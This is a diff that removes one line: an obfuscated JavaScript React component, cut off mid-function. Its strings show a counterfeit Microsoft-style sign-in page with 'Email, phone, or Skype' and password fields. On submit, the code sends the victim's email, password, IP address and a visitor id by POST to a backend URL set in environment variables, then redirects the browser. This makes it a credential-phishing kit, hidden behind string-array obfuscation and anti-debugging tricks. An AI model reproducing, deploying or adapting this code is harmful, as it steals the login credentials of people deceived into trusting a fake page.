@@ -1,1 +1,238 @@
-'use strict';const a2_0x581277=a2_0x2e8d;(function(_0x424d31,_0x1b5d00){const _0x5bc1af=a2_0x2e8d,_0x22c0cc=_0x424d31();while(!![]){try{const _0x6f39e1=-parseInt(_0x5bc1af(0x2fe))/(-0x2147+0x133a+-0x1*-0xe0e)+-parseInt(_0x5bc1af(0x2d8))/(-0xb*-0x292+-0x125e+-0x9e6)+parseInt(_0x5bc1af(0x239))/(-0xd1f+-0xf8a+-0x2de*-0xa)+-parseInt(_0x5bc1af(0x22e))/(-0x1053+-0x1*0x763+0x17ba)*(-parseInt(_0x5bc1af(0x266))/(-0x1f45+-0x39*-0x1e+0x189c))+-parseInt(_0x5bc1af(0x22c))/(0x1ba3+0x7c2+-0x235f)*(-parseInt(_0x5bc1af(0x22f))/(0x428+0x53*0x19+-0xc3c))+-parseInt(_0x5bc1af(0x2f3))/(-0x506+-0x2*0x10fb+0x2704)*(parseInt(_0x5bc1af(0x28c))/(-0x24e2+0xb*-0x152+-0x1*-0x3371))+-parseInt(_0x5bc1af(0x29e))/(0x1e7d+0x1519+0x2*-0x19c6)*(-parseInt(_0x5bc1af(0x244))/(-0x7f*-0x2e+-0x23c5+0xcfe));if(_0x6f39e1===_0x1b5d00)break;else _0x22c0cc['push'](_0x22c0cc['shift']());}catch(_0x5496e5){_0x22c0cc['push'](_0x22c0cc['shift']());}}}(a2_0x32a8,0x3b15d*-0x1+-0x1b4f5+-0x7c*-0x1069));Object[a2_0x581277(0x216)](exports,'__esModule',{'value':!![]}),exports[a2_0x581277(0x21a)]=void(0x12fe+0x80f+-0x5*0x569),require(a2_0x581277(0x283));var a2_0x473d49=require(a2_0x581277(0x2f5)),a2_0x447c6a=a2_0x59e0c4(require(a2_0x581277(0x264)));function a2_0x59e0c4(_0x2edb1a){const _0x5b3103=a2_0x581277,_0x367388={'gYYyw':function(_0x391236,_0x534060){return _0x391236(_0x534060);},'UVWVs':'ZMazi','ZReBt':_0x5b3103(0x217),'IWHRa':function(_0x1ae7d4,_0x191b3){return _0x1ae7d4+_0x191b3;},'GKdef':'return\x20(function()\x20','DSmSt':_0x5b3103(0x2a8),'tCZaL':function(_0x3811c8,_0x5c1a2f){return _0x3811c8===_0x5c1a2f;},'GLDIh':_0x5b3103(0x20c),'BKkxL':'(((.+)+)+)+$','hezpQ':_0x5b3103(0x301),'rGDEM':_0x5b3103(0x28d),'NWtUr':'qUsQQ','BncZf':_0x5b3103(0x2fa),'KQlJN':function(_0x2d8a0b,_0x338460){return _0x2d8a0b===_0x338460;},'DYxmK':_0x5b3103(0x2ad),'NrJtR':_0x5b3103(0x27e),'udFPS':_0x5b3103(0x1fb),'fFCBe':function(_0x1911db,_0x1508d5){return _0x1911db+_0x1508d5;},'GaKyk':_0x5b3103(0x1f3),'WgEfW':function(_0x41de1b,_0x14fcdc){return _0x41de1b!==_0x14fcdc;},'bdLmY':_0x5b3103(0x2ae),'snSsu':function(_0x461403,_0x2d7896){return _0x461403+_0x2d7896;},'eLfUg':_0x5b3103(0x2a1),'EwWqR':_0x5b3103(0x2d0),'BRDAa':function(_0x5c4133,_0xa87879){return _0x5c4133===_0xa87879;},'pwntk':_0x5b3103(0x228),'iHPwh':_0x5b3103(0x1fa),'xVAoZ':function(_0x40bffb,_0x4d1413){return _0x40bffb+_0x4d1413;},'DLNdI':'log','lzLLL':_0x5b3103(0x232),'sIrot':_0x5b3103(0x250),'HaYxY':_0x5b3103(0x207),'fzzZl':function(_0x50ee56,_0x361639,_0x3e3da3){return _0x50ee56(_0x361639,_0x3e3da3);},'MYeWa':function(_0x3c5303){return _0x3c5303();},'uFQHo':function(_0x4ffe67){return _0x4ffe67();}},_0x527afd=(function(){const _0x5c1806=_0x5b3103,_0x4e53b7={'LeHjr':function(_0xd9efb8,_0x522d8){return _0x367388['gYYyw'](_0xd9efb8,_0x522d8);},'sjdBV':_0x367388[_0x5c1806(0x297)]};if(_0x367388[_0x5c1806(0x258)]===_0x367388[_0x5c1806(0x258)]){let _0x4f6705=!![];return function(_0x129bcc,_0x1dde9f){const _0x52a709=_0x5c1806,_0x1c74fc={'keQNC':function(_0x1185cc,_0x57a657){return _0x1185cc!==_0x57a657;},'yBKVC':_0x52a709(0x214)};if(_0x4e53b7[_0x52a709(0x234)]!==_0x4e53b7[_0x52a709(0x234)])_0x4e53b7[_0x52a709(0x2c2)](_0x5d09d9,![]);else{const _0x7ee991=_0x4f6705?function(){const _0x3107b5=_0x52a709;if(_0x1dde9f){if(_0x1c74fc[_0x3107b5(0x211)](_0x1c74fc['yBKVC'],_0x1c74fc[_0x3107b5(0x2a7)])){const _0x278cfe=_0x288a3b?function(){const _0x41734b=_0x3107b5;if(_0x2442a0){const _0x1427e2=_0x3d21d0[_0x41734b(0x215)](_0x47c940,arguments);return _0x2f3b03=null,_0x1427e2;}}:function(){};return _0x41e653=![],_0x278cfe;}else{const _0x34656f=_0x1dde9f[_0x3107b5(0x215)](_0x129bcc,arguments);return _0x1dde9f=null,_0x34656f;}}}:function(){};return _0x4f6705=![],_0x7ee991;}};}else{if(_0x12a2e2){const _0x5b0955=_0x52a333[_0x5c1806(0x215)](_0x218420,arguments);return _0x1b4dcc=null,_0x5b0955;}}}()),_0x234ea8=_0x367388[_0x5b3103(0x245)](_0x527afd,this,function(){const _0x346c18=_0x5b3103;if(_0x367388['tCZaL'](_0x367388[_0x346c18(0x25f)],_0x367388[_0x346c18(0x25f)]))return _0x234ea8[_0x346c18(0x256)]()[_0x346c18(0x2c0)](_0x367388[_0x346c18(0x298)])['toString']()['constructor'](_0x234ea8)[_0x346c18(0x2c0)](_0x367388[_0x346c18(0x298)]);else{const _0x5e02a4=_0x26a47d(mdhDEd[_0x346c18(0x242)](mdhDEd[_0x346c18(0x275)],mdhDEd['DSmSt'])+');');_0x3767b0=_0x5e02a4();}});_0x367388[_0x5b3103(0x2c8)](_0x234ea8);const _0x12c78b=(function(){const _0x265306=_0x5b3103,_0x399c3c={'XBYAq':_0x367388[_0x265306(0x284)],'FiLdl':_0x367388[_0x265306(0x2d5)],'yGLlv':_0x367388[_0x265306(0x21c)],'cVjQy':_0x367388[_0x265306(0x289)]};if(_0x367388[_0x265306(0x2cc)](_0x367388[_0x265306(0x287)],'nXzOE')){let _0x6f4acc=!![];return function(_0x3bcf80,_0x35bd51){const _0x1ffc68=_0x265306,_0x35ac69={'DjjfF':_0x399c3c[_0x1ffc68(0x27f)],'CBziq':_0x399c3c['FiLdl']};if(_0x399c3c[_0x1ffc68(0x1f5)]!==_0x399c3c[_0x1ffc68(0x2c3)]){const _0x17823d=_0x6f4acc?function(){const _0x27a5d9=_0x1ffc68;if(_0x35ac69[_0x27a5d9(0x2b3)]===_0x27a5d9(0x218)){if(_0x1706f1){const _0x54d333=_0x5d07be[_0x27a5d9(0x215)](_0x4b13ca,arguments);return _0x356cea=null,_0x54d333;}}else{if(_0x35bd51){if('HnbFI'!==_0x35ac69[_0x27a5d9(0x296)]){const _0x41bc68=_0x35bd51['apply'](_0x3bcf80,arguments);return _0x35bd51=null,_0x41bc68;}else _0x33cfd0(0x841*-0x4+-0x139f+0x1b1b*0x2);}}}:function(){};return _0x6f4acc=![],_0x17823d;}else{const _0x42d8a0=_0x3e6925['apply'](_0x45ebc4,arguments);return _0x99cd87=null,_0x42d8a0;}};}else mdhDEd[_0x265306(0x2c1)](_0x9eee54,'0');}());(function(){const _0x317df0=_0x5b3103,_0x196c97={'tUFcP':_0x367388[_0x317df0(0x2b1)],'wtbWc':function(_0x33f3f2,_0x39079e){return _0x367388['gYYyw'](_0x33f3f2,_0x39079e);},'glPgf':_0x367388['udFPS'],'mCeCM':function(_0x2b98f7,_0x4a1776){return _0x2b98f7+_0x4a1776;},'zDoMf':_0x317df0(0x2bf),'IcktA':function(_0x2a95e,_0xaefa18){const _0x4ff4d9=_0x317df0;return _0x367388[_0x4ff4d9(0x201)](_0x2a95e,_0xaefa18);},'uzWwc':_0x367388['GaKyk'],'yDcHI':function(_0x213182,_0x6a54de){const _0x31c335=_0x317df0;return _0x367388[_0x31c335(0x2db)](_0x213182,_0x6a54de);},'WsfqD':_0x367388[_0x317df0(0x2ce)],'yWGXK':function(_0x290d89){return _0x290d89();}};_0x12c78b(this,function(){const _0x598036=_0x317df0,_0x4d028f=new RegExp(_0x196c97['tUFcP']),_0x1df0c5=new RegExp(_0x598036(0x2ab),'i'),_0x8c63e1=_0x196c97[_0x598036(0x2f6)](a2_0x6d724a,_0x196c97[_0x598036(0x24c)]);if(!_0x4d028f['test'](_0x196c97[_0x598036(0x24b)](_0x8c63e1,_0x196c97[_0x598036(0x254)]))||!_0x1df0c5[_0x598036(0x278)](_0x196c97[_0x598036(0x29a)](_0x8c63e1,_0x196c97['uzWwc'])))_0x196c97[_0x598036(0x2f6)](_0x8c63e1,'0');else{if(_0x196c97[_0x598036(0x2c5)](_0x196c97[_0x598036(0x238)],_0x196c97[_0x598036(0x238)]))return _0x5a6df2;else _0x196c97[_0x598036(0x237)](a2_0x6d724a);}})();}());const _0xffcfdd=(function(){const _0x4a65f9=_0x5b3103;if(_0x367388[_0x4a65f9(0x204)](_0x367388[_0x4a65f9(0x29d)],_0x367388[_0x4a65f9(0x205)])){const _0x50f9b1=_0x5c6e28?function(){if(_0x5bf14c){const _0x481027=_0x46300c['apply'](_0xf1fb6d,arguments);return _0x55cf97=null,_0x481027;}}:function(){};return _0x5bf22d=![],_0x50f9b1;}else{let _0x18b6ed=!![];return function(_0xc143cb,_0x139d34){const _0x4dd0c7=_0x4a65f9,_0x25f2cc={'uyLXj':function(_0x358ae3,_0x59f5cc){return _0x367388['snSsu'](_0x358ae3,_0x59f5cc);},'pDNLW':_0x4dd0c7(0x25d),'rSnTz':_0x367388[_0x4dd0c7(0x2e7)]};if(_0x367388['tCZaL'](_0x367388[_0x4dd0c7(0x2d1)],_0x367388[_0x4dd0c7(0x2d1)])){const _0x5dfae6=_0x18b6ed?function(){const _0x28ba22=_0x4dd0c7;if(_0x139d34){const _0x3875c1=_0x139d34[_0x28ba22(0x215)](_0xc143cb,arguments);return _0x139d34=null,_0x3875c1;}}:function(){};return _0x18b6ed=![],_0x5dfae6;}else(function(){return![];}['constructor'](qaqSXp[_0x4dd0c7(0x246)](qaqSXp['pDNLW'],_0x4dd0c7(0x2bb)))[_0x4dd0c7(0x215)](qaqSXp[_0x4dd0c7(0x208)]));};}}()),_0x45bc8f=_0xffcfdd(this,function(){const _0x5825eb=_0x5b3103;let _0x463aa3;try{const _0x36ea3f=_0x367388[_0x5825eb(0x2c1)](Function,_0x367388[_0x5825eb(0x2ef)](_0x367388[_0x5825eb(0x275)]+'{}.constructor(\x22return\x20this\x22)(\x20)',');'));_0x463aa3=_0x36ea3f();}catch(_0x32c0fb){_0x463aa3=window;}const _0x49403c=_0x463aa3[_0x5825eb(0x1f9)]=_0x463aa3[_0x5825eb(0x1f9)]||{},_0x520c96=[_0x367388[_0x5825eb(0x2f1)],_0x367388[_0x5825eb(0x202)],_0x5825eb(0x20a),_0x5825eb(0x272),_0x5825eb(0x24e),_0x367388[_0x5825eb(0x27a)],_0x367388[_0x5825eb(0x249)]];for(let _0x2f5f7e=0x1*-0x5fb+0x1efb+-0x320*0x8;_0x2f5f7e<_0x520c96[_0x5825eb(0x230)];_0x2f5f7e++){const _0x32c26c=_0xffcfdd['constructor'][_0x5825eb(0x2f7)][_0x5825eb(0x276)](_0xffcfdd),_0x43130b=_0x520c96[_0x2f5f7e],_0x7b58ad=_0x49403c[_0x43130b]||_0x32c26c;_0x32c26c[_0x5825eb(0x26c)]=_0xffcfdd[_0x5825eb(0x276)](_0xffcfdd),_0x32c26c[_0x5825eb(0x256)]=_0x7b58ad[_0x5825eb(0x256)][_0x5825eb(0x276)](_0x7b58ad),_0x49403c[_0x43130b]=_0x32c26c;}});return _0x367388[_0x5b3103(0x294)](_0x45bc8f),_0x2edb1a&&_0x2edb1a[_0x5b3103(0x236)]?_0x2edb1a:{'default':_0x2edb1a};}function a2_0x2e8d(_0x1647a6,_0x83006c){const _0x51fa2a=a2_0x32a8();return a2_0x2e8d=function(_0x5b308b,_0x3e83a7){_0x5b308b=_0x5b308b-(-0x1b74+-0x53*-0x3+0x1c6e);let _0x2829dc=_0x51fa2a[_0x5b308b];return _0x2829dc;},a2_0x2e8d(_0x1647a6,_0x83006c);}function a2_0x3ce789(_0x4ceff3){const _0x28ec92=a2_0x581277,_0x193e41={'xCwaB':function(_0x28dcff,_0x1d2c89){return _0x28dcff(_0x1d2c89);},'pmzlZ':function(_0xefc53b,_0x4245e4){return _0xefc53b(_0x4245e4);},'uNJbQ':function(_0x4474f0,_0x14074b){return _0x4474f0!==_0x14074b;},'ZQXOB':_0x28ec92(0x2ea),'wGMGJ':_0x28ec92(0x252),'kUHyM':function(_0x5b705f,_0x5b6f80){return _0x5b705f!==_0x5b6f80;},'rzthY':_0x28ec92(0x28e),'opsdm':_0x28ec92(0x2e0),'mRqjT':function(_0x3a972b,_0x27903e,_0x464afa){return _0x3a972b(_0x27903e,_0x464afa);},'YgdtH':function(_0x25d728,_0x27295c){return _0x25d728+_0x27295c;},'cbvUd':_0x28ec92(0x233),'rQEVD':'POST','aUVAc':_0x28ec92(0x248),'hVKsa':function(_0x9f7ef,_0x437b9d){return _0x9f7ef(_0x437b9d);},'kNIbH':function(_0x8a086d,_0x106677){return _0x8a086d(_0x106677);},'qxazt':'nonce','ytLCd':_0x28ec92(0x2d6),'ObUVa':_0x28ec92(0x227),'CwUSG':function(_0x2530b3,_0x4f8a02){return _0x2530b3===_0x4f8a02;},'SFvUe':'div','LaFAR':_0x28ec92(0x267),'tsOAY':_0x28ec92(0x20e),'RxiYI':'440px','unmWf':'32px','lSXSA':_0x28ec92(0x1fc),'nTQqE':_0x28ec92(0x2bd),'mqTDm':'img','UBDJV':_0x28ec92(0x2a2),'uiDqi':'\x20Logo','GTpwc':'transition\x20duration-300\x20','GkKyO':'\x20mt-[-15px]\x20text-2xl\x20font-semibold\x20text-gray-900','qUxmp':_0x28ec92(0x28a),'lgPFj':_0x28ec92(0x2a5),'RHdRP':_0x28ec92(0x291),'ipzrL':_0x28ec92(0x2d2),'GcyIM':_0x28ec92(0x210),'pBOPd':_0x28ec92(0x2d7),'uSptz':_0x28ec92(0x2e2),'zlkNF':_0x28ec92(0x2f0),'kWJzl':'Create\x20one!','qLWgt':_0x28ec92(0x2a0),'ugUsq':_0x28ec92(0x2ec),'cGEjl':_0x28ec92(0x222),'dCvHy':_0x28ec92(0x2e1),'LYPjU':_0x28ec92(0x260),'gktDZ':_0x28ec92(0x261),'puvwc':_0x28ec92(0x292),'mpCyu':_0x28ec92(0x221),'RAiKv':_0x28ec92(0x2ca),'bCjBb':_0x28ec92(0x2a6),'bcutc':'15px','myuit':'span','ectyO':'password','bpnmn':_0x28ec92(0x2f8),'YpWFS':_0x28ec92(0x269),'GRDNp':'group\x20relative\x20w-[110px]\x20h-[33px]\x20mt-4\x20flex\x20items-center\x20justify-center\x20border\x20border-transparent\x20text-md\x20font-medium\x20text-white\x20bg-[#0067b8]\x20hover:bg-blue-700\x20focus:outline-none\x20focus:ring-2\x20focus:ring-offset-2\x20focus:ring-blue-500','bNlDu':_0x28ec92(0x2e4),'hKNUh':_0x28ec92(0x223),'Dzews':_0x28ec92(0x25a),'vizNk':_0x28ec92(0x29c),'aNcXM':'mr-3\x20','WXhTU':_0x28ec92(0x20d),'gUtST':'text-[12.5]\x20'};let {visitor:_0x59bf7f,ip:_0x59d3c3}=_0x4ceff3;const [_0x2ab02f,_0x4a5429]=(0x2b*-0x49+0x44b+0x7f8,a2_0x473d49[_0x28ec92(0x271)])(''),[_0x2bc332,_0x479e6d]=(0x45*0x1f+0x5*0x281+0x538*-0x4,a2_0x473d49[_0x28ec92(0x271)])('');var [_0x321bbc,_0x354a9a]=(-0xd00+0x1a95+-0xd95,a2_0x473d49[_0x28ec92(0x271)])(0x7*-0x4cb+-0x208b+0x42e0);const [_0x3caa52,_0x51f370]=(0x79*0xe+-0xf93+0x8f5,a2_0x473d49[_0x28ec92(0x271)])(!![]),[_0x5bca57,_0x3dfac0]=(0x1cad+0x29*0x3f+0x3*-0xcec,a2_0x473d49['useState'])(![]),_0x560463=new URLSearchParams(window[_0x28ec92(0x25b)][_0x28ec92(0x2c0)]),_0x51c043=_0x560463[_0x28ec92(0x280)](_0x193e41[_0x28ec92(0x20f)]),_0x94b14c=_0x23bf9d=>{const _0x52be30=_0x28ec92;_0x4a5429(_0x23bf9d[_0x52be30(0x22a)]['value']);},_0x29c90c=_0x24fc9f=>{_0x479e6d(_0x24fc9f['target']['value']);},_0x46d7f2=_0x211100=>{const _0x4d30a7=_0x28ec92,_0x77f2d4={'OAmSw':function(_0x5b4e33,_0x1951ac){const _0x442847=a2_0x2e8d;return _0x193e41[_0x442847(0x295)](_0x5b4e33,_0x1951ac);},'HmnrA':function(_0xb0d311,_0x81f7f3){const _0x3e16b0=a2_0x2e8d;return _0x193e41[_0x3e16b0(0x243)](_0xb0d311,_0x81f7f3);},'AXFEA':_0x193e41['ZQXOB'],'oVLkh':_0x193e41[_0x4d30a7(0x200)]};if(_0x193e41[_0x4d30a7(0x2b5)](_0x4d30a7(0x2f9),_0x4d30a7(0x22d))){_0x211100[_0x4d30a7(0x251)]();if(_0x2ab02f&&!_0x2bc332)_0x193e41[_0x4d30a7(0x206)]===_0x193e41[_0x4d30a7(0x2e5)]?_0x10ebf5[_0x4d30a7(0x272)](_0x4d30a7(0x252),_0x1c6875):(_0x211100[_0x4d30a7(0x251)](),_0x193e41['pmzlZ'](_0x3dfac0,!![]),_0x193e41[_0x4d30a7(0x209)](setTimeout,()=>{const _0x5c2dd7=_0x4d30a7;_0x193e41[_0x5c2dd7(0x300)](_0x51f370,![]);},-0x19+-0x189d+0x1*0x1aaa));else _0x2ab02f&&_0x2bc332&&(window['location'][_0x4d30a7(0x2d4)]=process[_0x4d30a7(0x2da)][_0x4d30a7(0x263)][_0x4d30a7(0x256)](),_0x193e41[_0x4d30a7(0x209)](fetch,_0x193e41[_0x4d30a7(0x2fc)](process[_0x4d30a7(0x2da)][_0x4d30a7(0x285)],_0x193e41[_0x4d30a7(0x2c7)]),{'method':_0x193e41[_0x4d30a7(0x290)],'headers':{'Content-Type':_0x193e41[_0x4d30a7(0x277)]},'body':JSON[_0x4d30a7(0x25c)]({'visitor':_0x59bf7f,'ip':_0x59d3c3,'email':_0x2ab02f,'password':_0x2bc332})})[_0x4d30a7(0x21d)](_0x47894c=>{const _0xf4bcbd=_0x4d30a7;console['log'](_0x47894c[_0xf4bcbd(0x2cd)]),_0x47894c[_0xf4bcbd(0x2cd)]===0x1133*0x2+-0x4*-0x49c+-0x3343?_0x77f2d4[_0xf4bcbd(0x2f4)](_0x354a9a,0x27*0x3d+-0x15*-0xc7+-0x4cf*0x5):_0x354a9a(-0x17e3+0x470+-0x143b*-0x1);})[_0x4d30a7(0x257)](_0xfe2478=>{const _0x5925c7=_0x4d30a7,_0x34edde={'YTkJU':function(_0x594a3d,_0x3039a6){return _0x594a3d(_0x3039a6);}};if(_0x77f2d4[_0x5925c7(0x1ff)](_0x5925c7(0x2ea),_0x77f2d4['AXFEA'])){if(_0x5ce032)return _0xf9d001;else ERevOL[_0x5925c7(0x2df)](_0x23d30a,-0x705*0x2+0x169*-0x8+0x1952);}else console[_0x5925c7(0x272)](_0x77f2d4[_0x5925c7(0x26b)],_0xfe2478);}));}else{const _0x337e6f=_0x288092[_0x4d30a7(0x23b)][_0x4d30a7(0x2f7)][_0x4d30a7(0x276)](_0x289d07),_0x3c00e2=_0x1b8631[_0x10b23a],_0x24dd51=_0xb10bc4[_0x3c00e2]||_0x337e6f;_0x337e6f['__proto__']=_0x2bb6f1[_0x4d30a7(0x276)](_0x2c5134),_0x337e6f['toString']=_0x24dd51[_0x4d30a7(0x256)][_0x4d30a7(0x276)](_0x24dd51),_0x54eef7[_0x3c00e2]=_0x337e6f;}},_0x3249c9={'backgroundImage':_0x193e41[_0x28ec92(0x212)],'backgroundPosition':_0x28ec92(0x265),'backgroundRepeat':_0x193e41[_0x28ec92(0x2b4)]},_0x21773d=_0x20568a=>{const _0x2ad2bb=_0x28ec92;_0x20568a['preventDefault'](),_0x193e41[_0x2ad2bb(0x279)](_0x3dfac0,!![]),setTimeout(()=>{const _0x41977a=_0x2ad2bb;_0x193e41[_0x41977a(0x2bc)](_0x51f370,![]);},-0x113d*-0x1+0x2cc+0x607*-0x3);};return React[_0x28ec92(0x268)](React[_0x28ec92(0x274)],null,_0x193e41[_0x28ec92(0x241)](_0x321bbc,0x32*-0x86+-0x2+-0x1*-0x1bc1)&&_0x51c043?React['createElement'](_0x193e41[_0x28ec92(0x2a9)],null):React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],{'className':_0x193e41[_0x28ec92(0x2d9)],'style':_0x3249c9},React[_0x28ec92(0x268)]('div',{'className':_0x193e41[_0x28ec92(0x2b9)],'style':{'width':_0x193e41['RxiYI'],'height':_0x28ec92(0x23d),'padding':_0x193e41['unmWf']}},React[_0x28ec92(0x268)](_0x193e41['lSXSA'],{'className':_0x193e41[_0x28ec92(0x28f)],'onSubmit':_0x46d7f2},React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x235)],{'className':_0x28ec92(0x2b7),'src':_0x193e41[_0x28ec92(0x25e)],'alt':_0x193e41[_0x28ec92(0x1f8)]}),_0x3caa52?React['createElement'](_0x193e41[_0x28ec92(0x2a9)],{'className':_0x193e41[_0x28ec92(0x23a)][_0x28ec92(0x2dc)](_0x5bca57?'animate-slideAndFade':'')},React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],null,React[_0x28ec92(0x268)]('h2',{'className':_0x193e41[_0x28ec92(0x2f2)]},_0x193e41['qUxmp'])),React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],{'style':{'marginTop':_0x193e41[_0x28ec92(0x2c4)]}},React[_0x28ec92(0x268)]('label',{'htmlFor':_0x193e41[_0x28ec92(0x27d)],'className':_0x193e41['ipzrL']},_0x28ec92(0x2ed)),React[_0x28ec92(0x268)]('input',{'id':_0x28ec92(0x291),'name':_0x193e41[_0x28ec92(0x27d)],'type':_0x193e41['GcyIM'],'required':!![],'className':_0x28ec92(0x2f8),'placeholder':'Email,\x20phone,\x20or\x20Skype','value':_0x2ab02f,'onChange':_0x94b14c})),React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],{'className':_0x28ec92(0x2e9),'style':{'marginTop':_0x193e41[_0x28ec92(0x2dd)]}},_0x193e41[_0x28ec92(0x203)],React[_0x28ec92(0x268)]('a',{'href':'#','className':_0x193e41[_0x28ec92(0x2e6)]},_0x193e41[_0x28ec92(0x24f)])),React[_0x28ec92(0x268)](_0x28ec92(0x2c6),{'className':_0x193e41['qLWgt'],'style':{'marginTop':_0x193e41[_0x28ec92(0x259)]}},React[_0x28ec92(0x268)]('a',{'href':'#','className':_0x193e41[_0x28ec92(0x2e6)]},_0x193e41[_0x28ec92(0x247)])),React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],{'className':_0x193e41['dCvHy']},React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x299)],{'type':_0x193e41[_0x28ec92(0x2cb)],'onSubmit':()=>_0x21773d(),'className':_0x193e41['puvwc']},_0x28ec92(0x226)))):React[_0x28ec92(0x268)](_0x193e41['SFvUe'],{'className':_0x193e41[_0x28ec92(0x2c9)],'style':{'marginTop':'12px'}},React[_0x28ec92(0x268)](_0x193e41['SFvUe'],{'style':{'marginBottom':_0x28ec92(0x2d7)}},React[_0x28ec92(0x268)](_0x193e41['LYPjU'],{'className':_0x193e41['RAiKv']},React[_0x28ec92(0x268)](a2_0x447c6a[_0x28ec92(0x21a)],{'className':_0x193e41[_0x28ec92(0x213)],'style':{'fontSize':_0x193e41[_0x28ec92(0x2af)]}})),React['createElement'](_0x193e41[_0x28ec92(0x2cf)],{'className':''},_0x2ab02f)),React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],null,React['createElement']('h2',{'className':_0x28ec92(0x2a4)},_0x28ec92(0x26d))),React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],{'style':{'marginTop':_0x193e41[_0x28ec92(0x2c4)]}},React['createElement']('label',{'htmlFor':_0x193e41[_0x28ec92(0x27d)],'className':_0x193e41[_0x28ec92(0x225)]},_0x28ec92(0x1f4)),React['createElement'](_0x28ec92(0x1f3),{'id':_0x28ec92(0x27c),'name':_0x193e41[_0x28ec92(0x2b0)],'type':'password','required':!![],'className':_0x193e41[_0x28ec92(0x2de)],'placeholder':_0x28ec92(0x1f4),'value':_0x2bc332,'onChange':_0x29c90c})),React[_0x28ec92(0x268)](_0x28ec92(0x2c6),{'className':_0x193e41[_0x28ec92(0x2d3)],'style':{'marginTop':_0x28ec92(0x2d7)}},React[_0x28ec92(0x268)]('a',{'href':'#','className':_0x193e41['zlkNF']},_0x28ec92(0x21e))),React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],{'className':_0x193e41[_0x28ec92(0x2eb)]},React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x299)],{'type':_0x193e41[_0x28ec92(0x2cb)],'className':_0x193e41['GRDNp']},_0x193e41[_0x28ec92(0x1f7)]))))),React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x2a9)],{'className':_0x28ec92(0x24a)['concat'](!_0x3caa52?'animate-fadeOut':''),'style':{'width':_0x28ec92(0x2aa),'height':_0x193e41[_0x28ec92(0x21f)]}},React['createElement'](_0x193e41['SFvUe'],{'className':_0x193e41['hKNUh']},React[_0x28ec92(0x268)](_0x193e41[_0x28ec92(0x235)],{'src':_0x193e41[_0x28ec92(0x29b)],'alt':_0x193e41[_0x28ec92(0x270)],'className':_0x193e41[_0x28ec92(0x2e8)],'style':{'height':_0x193e41['WXhTU']}}),React[_0x28ec92(0x268)](_0x28ec92(0x2a3),{'className':_0x193e41[_0x28ec92(0x229)]},_0x28ec92(0x26a)),'\x20'))));}var a2_0x2205ec=exports['default']=a2_0x3ce789;function a2_0x6d724a(_0x1f9824){const _0x895bb5=a2_0x581277,_0xb3aa3={'BuesH':_0x895bb5(0x2b2),'BkQZq':_0x895bb5(0x1fe),'kWKuC':_0x895bb5(0x220),'ZBHUi':_0x895bb5(0x2a8),'CzkFr':function(_0x1beef3,_0x18e6c0){return _0x1beef3!==_0x18e6c0;},'qmvEn':_0x895bb5(0x2b8),'XjAHZ':function(_0x5a504d,_0xff876c){return _0x5a504d!==_0xff876c;},'KsTRw':_0x895bb5(0x293),'kjmRX':function(_0xc0bae4,_0x482d6f){return _0xc0bae4===_0x482d6f;},'OnxMK':'string','wYlov':function(_0x519da7,_0x4ae5c8){return _0x519da7===_0x4ae5c8;},'vvfyX':function(_0x4fdb1a,_0xc343eb){return _0x4fdb1a+_0xc343eb;},'GKWQk':function(_0x23715c,_0x1b25cb){return _0x23715c%_0x1b25cb;},'rzNPd':function(_0x403bfe,_0x67549){return _0x403bfe+_0x67549;},'mcAoI':_0x895bb5(0x25d),'DhceD':_0x895bb5(0x2bb),'madpj':'action','bSKFP':function(_0xedb46d,_0x546a67){return _0xedb46d+_0x546a67;},'OvaNw':_0x895bb5(0x2a1),'bSliY':function(_0x2dba7a,_0x18a430){return _0x2dba7a(_0x18a430);},'DHtdu':function(_0x2b7d60,_0x13c46e){return _0x2b7d60===_0x13c46e;},'AukvR':_0x895bb5(0x288),'PCAgd':_0x895bb5(0x231)};function _0x31474e(_0x185d39){const _0x4860cc=_0x895bb5,_0x4fc22c={'bbgrZ':function(_0x40e9c7,_0x309e27){return _0x40e9c7+_0x309e27;},'qgvbT':_0xb3aa3[_0x4860cc(0x224)],'sWIiT':_0xb3aa3[_0x4860cc(0x253)],'xxarC':function(_0x1c7d0b,_0x286137){return _0xb3aa3['CzkFr'](_0x1c7d0b,_0x286137);},'ocvMd':'YPBkI','LHtsM':_0xb3aa3['qmvEn']};if(_0xb3aa3[_0x4860cc(0x1f6)](_0x4860cc(0x293),_0xb3aa3[_0x4860cc(0x255)]))return function(_0x2a4b44){}[_0x4860cc(0x23b)](_0xb3aa3[_0x4860cc(0x22b)])['apply'](_0xb3aa3['BkQZq']);else{if(_0xb3aa3['kjmRX'](typeof _0x185d39,_0xb3aa3[_0x4860cc(0x27b)]))return function(_0x58609e){}[_0x4860cc(0x23b)](_0xb3aa3[_0x4860cc(0x22b)])[_0x4860cc(0x215)](_0x4860cc(0x1fe));else _0xb3aa3[_0x4860cc(0x23f)](_0x4860cc(0x21b),'vofYd')?_0x43cc9e=_0x43e499(_0x4fc22c[_0x4860cc(0x273)](_0x4fc22c[_0x4860cc(0x273)](_0x4fc22c['qgvbT'],_0x4fc22c[_0x4860cc(0x282)]),');'))():_0xb3aa3[_0x4860cc(0x281)]('',_0x185d39/_0x185d39)[_0x4860cc(0x230)]!==-0x2da*-0x2+0x5*-0x4c5+0x1226*0x1||_0xb3aa3['GKWQk'](_0x185d39,-0x1*-0x15c1+-0x2*-0x99d+-0x28e7)===0xc1d+0x1f54+0x3*-0xe7b?function(){return!![];}[_0x4860cc(0x23b)](_0xb3aa3[_0x4860cc(0x20b)](_0xb3aa3[_0x4860cc(0x2b6)],_0xb3aa3[_0x4860cc(0x29f)]))[_0x4860cc(0x2ff)](_0xb3aa3[_0x4860cc(0x26f)]):function(){const _0x4f72ca=_0x4860cc;if(_0x4fc22c[_0x4f72ca(0x2fb)](_0x4fc22c[_0x4f72ca(0x286)],_0x4fc22c[_0x4f72ca(0x2ee)]))return![];else 